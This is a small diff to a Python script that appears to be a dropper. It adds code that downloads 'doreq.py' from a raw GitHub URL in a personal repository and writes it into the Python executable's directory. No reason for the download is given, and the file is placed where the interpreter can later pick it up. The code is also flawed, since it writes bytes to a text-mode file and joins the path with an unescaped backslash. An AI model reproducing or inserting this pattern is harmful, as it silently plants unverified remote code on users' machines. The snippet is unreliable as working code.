@@ -1,4 +1,8 @@
 import os
 import sys
+import requests
 pythonloc = os.path.dirname(sys.executable)
-os.rename('doreq.py', pythonloc + '\doreq.py')
+cont = requests.get('https://raw.githubusercontent.com/presy12/testrepo/main/doreq.py').content
+with open('req.py', 'w') as req:
+  req.write(cont)
+os.rename('req.py', pythonloc + '\doreq.py')
